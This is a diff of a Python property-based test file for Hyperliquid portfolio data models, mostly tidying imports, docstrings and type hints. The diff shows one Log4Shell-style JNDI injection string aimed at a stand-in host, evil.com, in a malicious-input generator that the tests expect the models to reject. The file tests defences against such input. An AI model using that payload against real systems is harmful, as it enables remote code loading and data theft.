@@ -1,7 +1,8 @@
 """Property-based tests for Hyperliquid raw portfolio models.
 
 These tests validate critical security boundary models that process external portfolio data.
-The models tested here are essential for portfolio tracking, account value history, and PnL monitoring.
+The models tested here are essential for portfolio tracking, account value history,
+and PnL monitoring.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious portfolio data that could manipulate financial tracking
@@ -15,23 +16,23 @@ Property testing ensures comprehensive coverage of portfolio edge cases and adve
 """
 
 from decimal import Decimal
-from typing import Any
+from typing import Any, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
+from cyberdelta.apis.exceptions.parsing import (
+    DictStructureError,
+    SequenceLengthError,
+    StructureTypeError,
+)
 from cyberdelta.apis.hyperliquid.models.hl_raw_portfolio import (
     HyperliquidRawPortfolioHistoryEntry,
     HyperliquidRawPortfolioResponse,
     HyperliquidRawPortfolioTimeframeData,
     HyperliquidRawPortfolioTupleItem,
-)
-from cyberdelta.apis.exceptions.parsing import (
-    DictStructureError,
-    SequenceLengthError,
-    StructureTypeError,
 )
 
 
@@ -41,16 +42,24 @@ from cyberdelta.apis.exceptions.parsing import (
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values in milliseconds."""
+    """Generate valid timestamp values in milliseconds.
+
+    Returns:
+        SearchStrategy for int timestamp values.
+    """
     return st.integers(min_value=1640995200000, max_value=2147483647000)  # Valid MS timestamp range
 
 
 def financial_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for financial values (account value, PnL)."""
+    """Generate decimal strings for financial values (account value, PnL).
+
+    Returns:
+        SearchStrategy for str decimal values.
+    """
     return st.one_of([
         # Common financial values
-        st.decimals(min_value=Decimal("-1000000"), max_value=Decimal("1000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("-100000"), max_value=Decimal("100000"), places=6).map(str),
+        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
         # Common values
         st.just("0"),  # Zero value
         st.just("0.0"),  # Zero with decimal
@@ -67,11 +76,15 @@ def financial_decimal_strategy() -> SearchStrategy[str]:
 
 
 def vlm_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for VLM (Volume) values (non-negative)."""
+    """Generate decimal strings for VLM (Volume) values (non-negative).
+
+    Returns:
+        SearchStrategy for str VLM decimal values.
+    """
     return st.one_of([
         # Volume values
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("100000000"), places=6).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000000), places=8).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(100000000), places=6).map(str),
         # Common values
         st.just("0"),  # Zero volume
         st.just("0.0"),  # Zero with decimal
@@ -86,7 +99,11 @@ def vlm_decimal_strategy() -> SearchStrategy[str]:
 
 
 def timeframe_strategy() -> SearchStrategy[str]:
-    """Generate valid timeframe strings."""
+    """Generate valid timeframe strings.
+    
+    Returns:
+        SearchStrategy for valid timeframe strings.
+    """
     return st.sampled_from([
         "day",
         "week",
@@ -100,8 +117,12 @@ def timeframe_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_history_entry_list_data(draw) -> list[Any]:
-    """Generate valid history entry as list [timestamp, value]."""
+def valid_history_entry_list_data(draw: st.DrawFn) -> list[Any]:
+    """Generate valid history entry as list [timestamp, value].
+    
+    Returns:
+        List containing timestamp and value for history entry.
+    """
     return [
         draw(timestamp_strategy()),
         draw(financial_decimal_strategy()),
@@ -109,8 +130,12 @@ def valid_history_entry_list_data(draw) -> list[Any]:
 
 
 @st.composite
-def valid_history_entry_dict_data(draw) -> dict[int, Any]:
-    """Generate valid history entry as dict {0: timestamp, 1: value}."""
+def valid_history_entry_dict_data(draw: st.DrawFn) -> dict[int, Any]:
+    """Generate valid history entry as dict {0: timestamp, 1: value}.
+    
+    Returns:
+        Dict with timestamp and value for history entry.
+    """
     return {
         0: draw(timestamp_strategy()),
         1: draw(financial_decimal_strategy()),
@@ -118,8 +143,12 @@ def valid_history_entry_dict_data(draw) -> dict[int, Any]:
 
 
 @st.composite
-def valid_timeframe_data(draw) -> dict[str, Any]:
-    """Generate valid timeframe data."""
+def valid_timeframe_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid timeframe data.
+    
+    Returns:
+        Dict containing timeframe data with account value history.
+    """
     return {
         "accountValueHistory": draw(
             st.lists(valid_history_entry_list_data(), min_size=0, max_size=10)
@@ -130,8 +159,12 @@ def valid_timeframe_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_portfolio_tuple_item_data(draw) -> list[Any]:
-    """Generate valid portfolio tuple item as [timeframe, timeframe_data]."""
+def valid_portfolio_tuple_item_data(draw: st.DrawFn) -> list[Any]:
+    """Generate valid portfolio tuple item as [timeframe, timeframe_data].
+    
+    Returns:
+        List containing timeframe and timeframe data.
+    """
     return [
         draw(timeframe_strategy()),
         draw(valid_timeframe_data()),
@@ -139,13 +172,21 @@ def valid_portfolio_tuple_item_data(draw) -> list[Any]:
 
 
 @st.composite
-def valid_portfolio_response_data(draw) -> list[list[Any]]:
-    """Generate valid portfolio response as list of tuple items."""
+def valid_portfolio_response_data(draw: st.DrawFn) -> list[list[Any]]:
+    """Generate valid portfolio response as list of tuple items.
+    
+    Returns:
+        List of portfolio tuple items.
+    """
     return draw(st.lists(valid_portfolio_tuple_item_data(), min_size=0, max_size=5))
 
 
-def malicious_portfolio_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for portfolio security testing."""
+def malicious_portfolio_strategy() -> SearchStrategy[object]:
+    """Generate malicious values for portfolio security testing.
+    
+    Returns:
+        SearchStrategy for malicious portfolio values.
+    """
     return st.one_of([
         # Portfolio manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-portfolio}"),
@@ -198,7 +239,7 @@ class TestHyperliquidRawPortfolioHistoryEntryProperties:
     def test_history_entry_list_validation_success_properties(
         self, history_data: list[Any]
     ) -> None:
-        """Property: Valid history entry list data should always create valid HyperliquidRawPortfolioHistoryEntry objects."""
+        """Property: Valid history data should always create valid PortfolioHistoryEntry objects."""
         # Skip invalid data
         try:
             timestamp = history_data[0]
@@ -224,7 +265,11 @@ class TestHyperliquidRawPortfolioHistoryEntryProperties:
     def test_history_entry_dict_validation_success_properties(
         self, history_data: dict[int, Any]
     ) -> None:
-        """Property: Valid history entry dict data should always create valid HyperliquidRawPortfolioHistoryEntry objects."""
+        """Property: Valid history entry dict data should always create valid HyperliquidRaw.
+        
+        PortfolioHistoryEntry
+        objects.
+        """
         # Skip invalid data
         try:
             timestamp = history_data[0]
@@ -247,11 +292,11 @@ class TestHyperliquidRawPortfolioHistoryEntryProperties:
 
     @given(field_index=st.sampled_from([0, 1]), malicious_value=malicious_portfolio_strategy())
     def test_history_entry_security_boundary_properties(
-        self, field_index: int, malicious_value: Any
+        self, field_index: int, malicious_value: object
     ) -> None:
         """Property: History entry model should reject malicious inputs safely."""
         base_data = [1741886630493, "100.0"]
-        base_data[field_index] = malicious_value
+        base_data[field_index] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, StructureTypeError, SequenceLengthError)):
@@ -315,7 +360,9 @@ class TestHyperliquidRawPortfolioHistoryEntryProperties:
             st.dictionaries(st.text(), st.text()),  # Wrong dict structure
         ])
     )
-    def test_history_entry_structure_validation_properties(self, invalid_structure: Any) -> None:
+    def test_history_entry_structure_validation_properties(
+        self, invalid_structure: list[object] | str | int | dict[str, str]
+    ) -> None:
         """Property: History entry should reject invalid structures."""
         # Property: Invalid structures should be rejected
         with pytest.raises((
@@ -339,7 +386,11 @@ class TestHyperliquidRawPortfolioTimeframeDataProperties:
     def test_timeframe_data_validation_success_properties(
         self, timeframe_data: dict[str, Any]
     ) -> None:
-        """Property: Valid timeframe data should always create valid HyperliquidRawPortfolioTimeframeData objects."""
+        """Property: Valid timeframe data should always create valid HyperliquidRaw.
+        
+        PortfolioTimeframeData
+        objects.
+        """
         # Skip invalid data
         try:
             # Validate VLM field
@@ -375,7 +426,7 @@ class TestHyperliquidRawPortfolioTimeframeDataProperties:
         malicious_value=malicious_portfolio_strategy(),
     )
     def test_timeframe_data_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Timeframe data model should reject malicious inputs safely."""
         base_data = {
@@ -383,7 +434,7 @@ class TestHyperliquidRawPortfolioTimeframeDataProperties:
             "pnlHistory": [[1741886630493, "-50.0"]],
             "vlm": "12345.67",
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError)):
@@ -470,7 +521,11 @@ class TestHyperliquidRawPortfolioTupleItemProperties:
     def test_portfolio_tuple_item_validation_success_properties(
         self, tuple_item_data: list[Any]
     ) -> None:
-        """Property: Valid portfolio tuple item data should always create valid HyperliquidRawPortfolioTupleItem objects."""
+        """Property: Valid portfolio tuple item data should always create valid HyperliquidRaw.
+        
+        PortfolioTupleItem
+        objects.
+        """
         # Skip invalid data
         try:
             timeframe = tuple_item_data[0]
@@ -507,7 +562,7 @@ class TestHyperliquidRawPortfolioTupleItemProperties:
 
     @given(field_index=st.sampled_from([0, 1]), malicious_value=malicious_portfolio_strategy())
     def test_portfolio_tuple_item_security_boundary_properties(
-        self, field_index: int, malicious_value: Any
+        self, field_index: int, malicious_value: object
     ) -> None:
         """Property: Portfolio tuple item model should reject malicious inputs safely."""
         base_data = [
@@ -518,7 +573,7 @@ class TestHyperliquidRawPortfolioTupleItemProperties:
                 "vlm": "12345.67",
             },
         ]
-        base_data[field_index] = malicious_value
+        base_data[field_index] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, StructureTypeError, SequenceLengthError)):
@@ -535,7 +590,7 @@ class TestHyperliquidRawPortfolioTupleItemProperties:
         ])
     )
     def test_portfolio_tuple_item_structure_validation_properties(
-        self, invalid_structure: Any
+        self, invalid_structure: object
     ) -> None:
         """Property: Portfolio tuple item should reject invalid structures."""
         # Property: Invalid structures should be rejected
@@ -555,7 +610,11 @@ class TestHyperliquidRawPortfolioResponseProperties:
     def test_portfolio_response_validation_success_properties(
         self, portfolio_data: list[list[Any]]
     ) -> None:
-        """Property: Valid portfolio response data should always create valid HyperliquidRawPortfolioResponse objects."""
+        """Property: Valid portfolio response data should always create valid HyperliquidRaw.
+        
+        PortfolioResponse
+        objects.
+        """
         # Skip invalid data
         try:
             for tuple_item in portfolio_data:
@@ -592,7 +651,7 @@ class TestHyperliquidRawPortfolioResponseProperties:
         assert len(obj.root) == len(portfolio_data)
 
     @given(malicious_value=malicious_portfolio_strategy())
-    def test_portfolio_response_security_boundary_properties(self, malicious_value: Any) -> None:
+    def test_portfolio_response_security_boundary_properties(self, malicious_value: object) -> None:
         """Property: Portfolio response model should reject malicious inputs safely."""
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, StructureTypeError)):
@@ -607,7 +666,7 @@ class TestHyperliquidRawPortfolioResponseProperties:
         ])
     )
     def test_portfolio_response_structure_validation_properties(
-        self, invalid_structure: Any
+        self, invalid_structure: object
     ) -> None:
         """Property: Portfolio response should reject invalid structures."""
         # Property: Invalid structures should be rejected
@@ -634,7 +693,7 @@ class TestHyperliquidRawPortfolioIntegrationProperties:
         malicious_history_entry=malicious_portfolio_strategy(),
     )
     def test_portfolio_models_integration_properties(
-        self, portfolio_data: list[list[Any]], malicious_history_entry: Any
+        self, portfolio_data: list[list[Any]], malicious_history_entry: object
     ) -> None:
         """Property: Portfolio models should work consistently together."""
         # Skip invalid data
@@ -773,7 +832,7 @@ def test_HyperliquidRawPortfolioResponse_real_world_example() -> None:
 
 def test_HyperliquidRawPortfolioResponse_empty_list_example() -> None:
     """Test with empty portfolio response."""
-    payload = []
+    payload: list[Any] = []
     obj = HyperliquidRawPortfolioResponse.model_validate(payload)
     assert obj.root == []
 
@@ -809,7 +868,7 @@ def test_HyperliquidRawPortfolioTimeframeData_scientific_notation_example() -> N
 
 def test_HyperliquidRawPortfolioTimeframeData_empty_history_example() -> None:
     """Test with empty history lists."""
-    payload = {
+    payload: dict[str, str | list[dict[str, str]]] = {
         "accountValueHistory": [],
         "pnlHistory": [],
         "vlm": "0",
